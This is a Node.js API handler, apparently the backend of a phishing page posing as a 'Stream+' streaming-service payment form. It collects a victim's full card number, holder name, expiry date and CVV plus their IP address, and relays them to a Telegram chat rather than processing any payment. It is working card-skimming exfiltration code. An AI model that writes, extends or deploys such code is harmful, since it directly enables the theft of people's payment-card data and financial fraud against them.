// POST /api/send-payment — card number, card holder, expiry, CVV only
const { clientIp, sendTelegram, cors } = require('./_telegram');

module.exports = async (req, res) => {
    cors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    try {
        const {
            card_number,
            creditCard,
            card_name,
            cardName,
            card_holder,
            expiry,
            expiryDate,
            cvv,
            ip
        } = req.body;

        const card = (card_number || creditCard || '').toString().trim();
        const holder = (card_holder || card_name || cardName || '').toString().trim();
        const exp = (expiry || expiryDate || '').toString().trim();
        const security = (cvv || '').toString().trim();

        if (!card || !holder || !exp || !security) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields (card_number, card_holder, expiry, cvv)'
            });
        }

        const message =
`💳 [Stream+ Payment]

- Card Number : <code>${card}</code>
- Card Holder : <code>${holder}</code>
- Exp Date : <code>${exp}</code>
- CVV : <code>${security}</code>
- IP : ${ip || clientIp(req)}

<blockquote>└ © Stream+ Server</blockquote>`;

        const result = await sendTelegram(message);

        return res.status(200).json({
            success: true,
            message: 'Payment data sent successfully',
            messageId: result.message_id,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('[send-payment]', error.message);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
};
